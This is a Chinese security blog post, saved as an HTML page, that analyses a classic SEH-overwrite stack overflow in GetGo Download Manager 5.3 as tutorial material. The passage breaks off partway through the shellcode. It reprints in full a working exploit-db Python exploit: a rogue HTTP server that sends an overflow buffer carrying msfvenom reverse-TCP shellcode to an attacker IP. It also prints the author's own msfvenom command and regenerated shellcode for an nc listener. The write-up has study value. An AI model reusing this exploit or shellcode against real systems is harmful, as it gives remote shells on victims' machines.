@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>一次失败的栈溢出(SEH)之GetGo Download Manager | r00tk1t&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="对一个年代久远的经典栈溢出，从漏洞分析到编写exp的过程进行了记录。我个人正在录制二进制安全系列教程，该样本将作为经典栈溢出的讲解实例。收录：二进制安全系列教程链接：https://pan.baidu.com/s/1ltcHIehhLFVFMvru6tGQ8A 密码：axje">
+<meta name="keywords" content="stack-overrun,exploit,SEH overwrite">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次失败的栈溢出(SEH)之GetGo Download Manager">
+<meta property="og:url" content="https://r00tk1ts.github.io/2018/07/07/一次失败的栈溢出(SEH)之GetGo Download Manager/index.html">
+<meta property="og:site_name" content="r00tk1t&#39;s blog">
+<meta property="og:description" content="对一个年代久远的经典栈溢出，从漏洞分析到编写exp的过程进行了记录。我个人正在录制二进制安全系列教程，该样本将作为经典栈溢出的讲解实例。收录：二进制安全系列教程链接：https://pan.baidu.com/s/1ltcHIehhLFVFMvru6tGQ8A 密码：axje">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_1.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_2.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_3.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_4.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_5.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_6.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_7.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_8.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_9.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_10.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_11.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_12.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_13.png">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_14.png">
+<meta property="og:updated_time" content="2020-10-20T13:01:02.387Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一次失败的栈溢出(SEH)之GetGo Download Manager">
+<meta name="twitter:description" content="对一个年代久远的经典栈溢出，从漏洞分析到编写exp的过程进行了记录。我个人正在录制二进制安全系列教程，该样本将作为经典栈溢出的讲解实例。收录：二进制安全系列教程链接：https://pan.baidu.com/s/1ltcHIehhLFVFMvru6tGQ8A 密码：axje">
+<meta name="twitter:image" content="https://r00tk1ts.github.io/images/bin-security/stack-based/180703_1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="r00tk1t&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">r00tk1t</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">二进制安全 | Web安全 | 伪装成程序员的菜鸡</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/tags">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="mailto: 1903442252@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/r00tk1ts" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/r00tk1t-5" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/2698344533" title="weibo">weibo</a>
+                            
+                                <a class="fl QQ" target="_blank" href="https://user.qzone.qq.com/1903442252" title="QQ">QQ</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/SEH-overwrite/" style="font-size: 10px;">SEH overwrite</a> <a href="/tags/algorithm/" style="font-size: 11.67px;">algorithm</a> <a href="/tags/browser/" style="font-size: 10px;">browser</a> <a href="/tags/chrome/" style="font-size: 16.67px;">chrome</a> <a href="/tags/chrome-sandbox/" style="font-size: 16.67px;">chrome-sandbox</a> <a href="/tags/cpp/" style="font-size: 20px;">cpp</a> <a href="/tags/cpp-primer/" style="font-size: 18.33px;">cpp-primer</a> <a href="/tags/cpp-templates/" style="font-size: 11.67px;">cpp-templates</a> <a href="/tags/dll-hooking/" style="font-size: 10px;">dll hooking</a> <a href="/tags/exploit/" style="font-size: 12.5px;">exploit</a> <a href="/tags/glibc/" style="font-size: 10px;">glibc</a> <a href="/tags/glibc-heap/" style="font-size: 13.33px;">glibc-heap</a> <a href="/tags/linux/" style="font-size: 10.83px;">linux</a> <a href="/tags/linux-kernel/" style="font-size: 14.17px;">linux-kernel</a> <a href="/tags/mmap/" style="font-size: 10px;">mmap</a> <a href="/tags/novice/" style="font-size: 17.5px;">novice</a> <a href="/tags/php/" style="font-size: 10.83px;">php</a> <a href="/tags/pool/" style="font-size: 10px;">pool</a> <a href="/tags/pwn/" style="font-size: 19.17px;">pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 15px;">pwnable.kr</a> <a href="/tags/resources/" style="font-size: 10px;">resources</a> <a href="/tags/stack-overrun/" style="font-size: 11.67px;">stack-overrun</a> <a href="/tags/tutorial/" style="font-size: 10px;">tutorial</a> <a href="/tags/ulk/" style="font-size: 14.17px;">ulk</a> <a href="/tags/web/" style="font-size: 10.83px;">web</a> <a href="/tags/windows/" style="font-size: 15.83px;">windows</a> <a href="/tags/windows-kernel/" style="font-size: 14.17px;">windows-kernel</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/wrk/" style="font-size: 12.5px;">wrk</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://eternalsakura13.com">樱花师傅</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://chybeta.github.io/">Chybeta</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">k0shl</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://o0xmuhe.github.io/">o0xmuhe</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://bestwing.me/">swing</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://yixuankeer.win/">joker</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.hackersb.cn/">王松_Striker</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy/">l3m0n</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://0x48.pw/">Hcamael</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.nuptzj.cn/">画船听雨</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.bodkin.ren/">老锥</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.zerokeeper.com/">ZeroKeeper</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.ycjcl.cc/">信鑫</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.wowotech.net/">wowotech</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://fuzzysecurity.com/">fuzzySecurity</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://rootkits.xyz/">rootkits.xyz</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.pentestingexperts.com/">pentestingexperts</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.skylined.nl/">skylined</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://systemk1t.github.io/">systemk1t</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">二进制狗一枚，懂点Web安全，一个伪装成程序员混迹在某公司的菜鸡。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">r00tk1t</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">r00tk1t</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">二进制安全 | Web安全 | 伪装成程序员的菜鸡</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/tags">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="mailto: 1903442252@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/r00tk1ts" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/r00tk1t-5" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/2698344533" title="weibo">weibo</a>
+                    
+                        <a class="QQ" target="_blank" href="https://user.qzone.qq.com/1903442252" title="QQ">QQ</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-一次失败的栈溢出(SEH)之GetGo Download Manager" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/07/07/一次失败的栈溢出(SEH)之GetGo Download Manager/" class="article-date">
+      <time datetime="2018-07-07T03:12:11.000Z" itemprop="datePublished">2018-07-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      一次失败的栈溢出(SEH)之GetGo Download Manager
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/binary-security/">binary-security</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SEH-overwrite/">SEH overwrite</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/exploit/">exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack-overrun/">stack-overrun</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>对一个年代久远的经典栈溢出，从漏洞分析到编写exp的过程进行了记录。我个人正在录制二进制安全系列教程，该样本将作为经典栈溢出的讲解实例。<br>收录：二进制安全系列教程<br>链接：<a href="https://pan.baidu.com/s/1ltcHIehhLFVFMvru6tGQ8A" target="_blank" rel="noopener">https://pan.baidu.com/s/1ltcHIehhLFVFMvru6tGQ8A</a> 密码：axje</p>
+<a id="more"></a>
+<h1 id="一次失败的栈溢出-SEH-之GetGo-Download-Manager"><a href="#一次失败的栈溢出-SEH-之GetGo-Download-Manager" class="headerlink" title="一次失败的栈溢出(SEH)之GetGo Download Manager"></a>一次失败的栈溢出(SEH)之GetGo Download Manager</h1><p>寻找栈溢出SEH样本的过程中，在exp-db上看到了这个洞。详情请参考&lt;待补充&gt;。</p>
+<p>尽管没有CVE（提交者在XP SP3测试可还行），但是提交的exp很细致，是我喜欢的画风，同时也一并提供了漏洞软件。</p>
+<p>GetGo Download Manager是一个下载工具，类似迅雷这种（当然不清楚服务端处理是否一个套路）。根据exp-db的信息来看，download具体URL资源时存在着一个栈溢出漏洞，提交者使用了覆盖SEH的方法进行了漏洞的利用。</p>
+<h2 id="侦查"><a href="#侦查" class="headerlink" title="侦查"></a>侦查</h2><p>先来看看提交者的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Exploit Author: bzyo</span></span><br><span class="line"><span class="comment"># Twitter: @bzyo_</span></span><br><span class="line"><span class="comment"># Exploit Title: GetGo Download Manager 5.3.0.2712 - Remote Buffer Overflow (SEH)</span></span><br><span class="line"><span class="comment"># Date: 02-24-2018</span></span><br><span class="line"><span class="comment"># Vulnerable Software: GetGo Download Manager 5.3.0.2712</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://www.getgosoft.com/</span></span><br><span class="line"><span class="comment"># Version: 5.3.0.2712</span></span><br><span class="line"><span class="comment"># Software Link: https://www.exploit-db.com/apps/b26d82eadef93531f8beafac6105ef13-GetGoDMSetup.exe</span></span><br><span class="line"><span class="comment"># Tested On: Windows XP SP3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># PoC: </span></span><br><span class="line"><span class="comment"># 1. setup listener 443 on attacking machine</span></span><br><span class="line"><span class="comment"># 2. run script on attacking machine</span></span><br><span class="line"><span class="comment"># 3. open app on victim machine</span></span><br><span class="line"><span class="comment"># 4. go to download</span></span><br><span class="line"><span class="comment"># 5. select new, add http://attackerip to URL, index.html to File Name, and select OK</span></span><br><span class="line"><span class="comment"># 6. check listener, remote shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">host = <span class="string">"192.168.0.149"</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">  </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((host, port))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n[+] listening on %d ..."</span> % port</span><br><span class="line"> </span><br><span class="line">bz, addr = s.accept()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] connection accepted from %s"</span> % addr[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">20</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#jump 6 </span></span><br><span class="line">nseh = <span class="string">"\xeb\x06\x90\x90"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#0x72d11f39 : pop edi # pop esi # ret 0x04 |  &#123;PAGE_EXECUTE_READ&#125; [msacm32.drv]</span></span><br><span class="line">seh = <span class="string">"\x39\x1f\xd1\x72"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.149 LPORT=443 -b "\x00" -f c</span></span><br><span class="line"><span class="comment">#Payload size: 351 bytes</span></span><br><span class="line">reverse = (</span><br><span class="line"><span class="string">"\xba\x8f\xf6\x0e\x24\xd9\xf7\xd9\x74\x24\xf4\x58\x33\xc9\xb1"</span></span><br><span class="line"><span class="string">"\x52\x31\x50\x12\x83\xc0\x04\x03\xdf\xf8\xec\xd1\x23\xec\x73"</span></span><br><span class="line"><span class="string">"\x19\xdb\xed\x13\x93\x3e\xdc\x13\xc7\x4b\x4f\xa4\x83\x19\x7c"</span></span><br><span class="line"><span class="string">"\x4f\xc1\x89\xf7\x3d\xce\xbe\xb0\x88\x28\xf1\x41\xa0\x09\x90"</span></span><br><span class="line"><span class="string">"\xc1\xbb\x5d\x72\xfb\x73\x90\x73\x3c\x69\x59\x21\x95\xe5\xcc"</span></span><br><span class="line"><span class="string">"\xd5\x92\xb0\xcc\x5e\xe8\x55\x55\x83\xb9\x54\x74\x12\xb1\x0e"</span></span><br><span class="line"><span class="string">"\x56\x95\x16\x3b\xdf\x8d\x7b\x06\xa9\x26\x4f\xfc\x28\xee\x81"</span></span><br><span class="line"><span class="string">"\xfd\x87\xcf\x2d\x0c\xd9\x08\x89\xef\xac\x60\xe9\x92\xb6\xb7"</span></span><br><span class="line"><span class="string">"\x93\x48\x32\x23\x33\x1a\xe4\x8f\xc5\xcf\x73\x44\xc9\xa4\xf0"</span></span><br><span class="line"><span class="string">"\x02\xce\x3b\xd4\x39\xea\xb0\xdb\xed\x7a\x82\xff\x29\x26\x50"</span></span><br><span class="line"><span class="string">"\x61\x68\x82\x37\x9e\x6a\x6d\xe7\x3a\xe1\x80\xfc\x36\xa8\xcc"</span></span><br><span class="line"><span class="string">"\x31\x7b\x52\x0d\x5e\x0c\x21\x3f\xc1\xa6\xad\x73\x8a\x60\x2a"</span></span><br><span class="line"><span class="string">"\x73\xa1\xd5\xa4\x8a\x4a\x26\xed\x48\x1e\x76\x85\x79\x1f\x1d"</span></span><br><span class="line"><span class="string">"\x55\x85\xca\xb2\x05\x29\xa5\x72\xf5\x89\x15\x1b\x1f\x06\x49"</span></span><br><span class="line"><span class="string">"\x3b\x20\xcc\xe2\xd6\xdb\x87\xcc\x8f\xe3\xc2\xa5\xcd\xe3\xed"</span></span><br><span class="line"><span class="string">"\x8e\x5b\x05\x87\xe0\x0d\x9e\x30\x98\x17\x54\xa0\x65\x82\x11"</span></span><br><span class="line"><span class="string">"\xe2\xee\x21\xe6\xad\x06\x4f\xf4\x5a\xe7\x1a\xa6\xcd\xf8\xb0"</span></span><br><span class="line"><span class="string">"\xce\x92\x6b\x5f\x0e\xdc\x97\xc8\x59\x89\x66\x01\x0f\x27\xd0"</span></span><br><span class="line"><span class="string">"\xbb\x2d\xba\x84\x84\xf5\x61\x75\x0a\xf4\xe4\xc1\x28\xe6\x30"</span></span><br><span class="line"><span class="string">"\xc9\x74\x52\xed\x9c\x22\x0c\x4b\x77\x85\xe6\x05\x24\x4f\x6e"</span></span><br><span class="line"><span class="string">"\xd3\x06\x50\xe8\xdc\x42\x26\x14\x6c\x3b\x7f\x2b\x41\xab\x77"</span></span><br><span class="line"><span class="string">"\x54\xbf\x4b\x77\x8f\x7b\x7b\x32\x8d\x2a\x14\x9b\x44\x6f\x79"</span></span><br><span class="line"><span class="string">"\x1c\xb3\xac\x84\x9f\x31\x4d\x73\xbf\x30\x48\x3f\x07\xa9\x20"</span></span><br><span class="line"><span class="string">"\x50\xe2\xcd\x97\x51\x27"</span>)</span><br><span class="line"> </span><br><span class="line">fill = <span class="string">"D"</span>*(<span class="number">4055</span> - len(reverse))</span><br><span class="line"> </span><br><span class="line">payload = junk + nseh + seh + reverse + fill</span><br><span class="line"> </span><br><span class="line">buffer = payload + <span class="string">"\r"</span></span><br><span class="line">buffer+= payload + <span class="string">"\r"</span></span><br><span class="line">buffer+= payload + <span class="string">"\r\n"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> bz.recv(<span class="number">1000</span>)</span><br><span class="line">bz.send(buffer)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] sending buffer ok\n"</span></span><br><span class="line"> </span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">bz.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p>根据payload的布局，可以肯定这是个相当经典的SEH覆盖利用。按照这种布局，在触发异常时，程序会走到seh handler的地址，这里是个pop | pop | ret（根据注释），而因为esp在程序走到seh handler时一定是指向[nseh-8]处，所以seh handler执行pop | pop | ret会返回到nseh处，而nseh是个短jmp，它会跳过6个字节（两字节nop + 4字节seh），跳转到reverse这段shellcode执行。这段shellcode会反弹tcp shell到192.168.0.149:443，注释中也给出了msfvenom的生成参数。</p>
+<p>##调整exp</p>
+<p>因为我本地环境和提交者有所差异，所以shellcode需要调整一下，pop|pop|ret的地址也要在victim环境中重新搜索（如果提交者给出的地址处在non-ASLR的模块上，应该直接可用）。</p>
+<p>重新生成一段shellcode，修改一下IP地址，我的attacker addr是192.168.1.100，victim addr是192.168.1.101，attacker上用nc在8686端口listen：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=8686 -b "\x00" -f python</span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">No Arch selected, selecting Arch: x86 from the payload</span><br><span class="line">Found 10 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 351 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 351</span><br><span class="line">Payload size: 351 bytes</span><br><span class="line">buf =  ""</span><br><span class="line">buf += "\xd9\xcf\xd9\x74\x24\xf4\xba\xa3\xfc\xc8\xfe\x5e\x2b"</span><br><span class="line">buf += "\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xf5\xef\x2a"</span><br><span class="line">buf += "\x0b\x05\xe7\x29\xf4\xf5\xf8\x4d\x7c\x10\xc9\x4d\x1a"</span><br><span class="line">buf += "\x51\x7a\x7e\x68\x37\x77\xf5\x3c\xa3\x0c\x7b\xe9\xc4"</span><br><span class="line">buf += "\xa5\x36\xcf\xeb\x36\x6a\x33\x6a\xb5\x71\x60\x4c\x84"</span><br><span class="line">buf += "\xb9\x75\x8d\xc1\xa4\x74\xdf\x9a\xa3\x2b\xcf\xaf\xfe"</span><br><span class="line">buf += "\xf7\x64\xe3\xef\x7f\x99\xb4\x0e\x51\x0c\xce\x48\x71"</span><br><span class="line">buf += "\xaf\x03\xe1\x38\xb7\x40\xcc\xf3\x4c\xb2\xba\x05\x84"</span><br><span class="line">buf += "\x8a\x43\xa9\xe9\x22\xb6\xb3\x2e\x84\x29\xc6\x46\xf6"</span><br><span class="line">buf += "\xd4\xd1\x9d\x84\x02\x57\x05\x2e\xc0\xcf\xe1\xce\x05"</span><br><span class="line">buf += "\x89\x62\xdc\xe2\xdd\x2c\xc1\xf5\x32\x47\xfd\x7e\xb5"</span><br><span class="line">buf += "\x87\x77\xc4\x92\x03\xd3\x9e\xbb\x12\xb9\x71\xc3\x44"</span><br><span class="line">buf += "\x62\x2d\x61\x0f\x8f\x3a\x18\x52\xd8\x8f\x11\x6c\x18"</span><br><span class="line">buf += "\x98\x22\x1f\x2a\x07\x99\xb7\x06\xc0\x07\x40\x68\xfb"</span><br><span class="line">buf += "\xf0\xde\x97\x04\x01\xf7\x53\x50\x51\x6f\x75\xd9\x3a"</span><br><span class="line">buf += "\x6f\x7a\x0c\xec\x3f\xd4\xff\x4d\xef\x94\xaf\x25\xe5"</span><br><span class="line">buf += "\x1a\x8f\x56\x06\xf1\xb8\xfd\xfd\x92\x06\xa9\xfc\x06"</span><br><span class="line">buf += "\xef\xa8\xfe\xe7\x01\x25\x18\x8d\xcd\x60\xb3\x3a\x77"</span><br><span class="line">buf += "\x29\x4f\xda\x78\xe7\x2a\xdc\xf3\x04\xcb\x93\xf3\x61"</span><br><span class="line">buf += "\xdf\x44\xf4\x3f\xbd\xc3\x0b\xea\xa9\x88\x9e\x71\x29"</span><br><span class="line">buf += "\xc6\x82\x2d\x7e\x8f\x75\x24\xea\x3d\x2f\x9e\x08\xbc"</span><br><span class="line">buf += "\xa9\xd9\x88\x1b\x0a\xe7\x11\xe9\x36\xc3\x01\x37\xb6"</span><br><span class="line">buf += "\x4f\x75\xe7\xe1\x19\x23\x41\x58\xe8\x9d\x1b\x37\xa2"</span><br><span class="line">buf += "\x49\xdd\x7b\x75\x0f\xe2\x51\x03\xef\x53\x0c\x52\x10"</span><br><span class="line">buf += "\x5b\xd8\x52\x69\x81\x78\x9c\xa0\x01\x88\xd7\xe8\x20"</span><br><span class="line">buf += 